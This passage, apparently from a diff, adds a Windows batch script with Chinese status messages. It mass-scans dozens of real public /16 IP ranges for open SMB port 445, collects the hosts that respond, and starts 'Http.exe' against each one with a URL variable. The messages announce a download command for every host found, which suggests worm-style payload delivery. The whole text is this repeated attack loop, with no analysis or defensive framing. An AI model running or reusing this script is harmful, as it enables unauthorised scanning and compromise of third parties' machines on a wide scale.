+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 222.76.0.0 222.76.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 222.89.0.0 222.89.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 223.244.0.0 223.244.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 223.26.0.0 223.26.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 223.4.0.0 223.4.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 23.104.0.0 23.104.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 23.234.0.0 23.234.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 23.245.0.0 23.245.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 23.27.0.0 23.27.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 27.126.0.0 27.126.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 27.255.0.0 27.255.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 27.54.0.0 27.54.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 42.121.0.0 42.121.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 42.51.0.0 42.51.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 45.64.0.0 45.64.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 49.247.0.0 49.247.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 50.63.0.0 50.63.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 58.215.0.0 58.215.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 58.216.0.0 58.216.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 58.218.0.0 58.218.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 58.221.0.0 58.221.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 58.49.0.0 58.49.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 58.56.0.0 58.56.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 58.64.0.0 58.64.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 59.188.0.0 59.188.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 59.53.0.0 59.53.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 60.169.0.0 60.169.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 60.190.0.0 60.190.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 61.145.0.0 61.145.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 61.152.0.0 61.152.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 61.153.0.0 61.153.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 61.155.0.0 61.155.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 61.156.0.0 61.156.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 61.160.0.0 61.160.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 61.164.0.0 61.164.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 61.191.0.0 61.191.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 61.28.0.0 61.28.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 64.235.0.0 64.235.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 66.147.0.0 66.147.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 69.176.0.0 69.176.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 69.90.0.0 69.90.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 72.8.0.0 72.8.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+cls&s syn 98.126.0.0 98.126.255.255 445 /save 
+for /f "eol=- tokens=1 delims= " %%i in (result.txt) do echo %%i>>s1.txt
+for /f "eol=P tokens=1 delims= " %%i in (s1.txt) do echo %%i>>s2.txt
+for /f "eol=S tokens=1 delims= " %%i in (s2.txt) do echo %%i>>host.txt
+del Result.txt s2.txt s1.txt 
+cls
+for /f %%a in (host.txt) do (
+echo 发现主机IP为:%%a 正在进行下载命令...
+start Http.exe %%a %http%
+)
+del host.txt /q
+
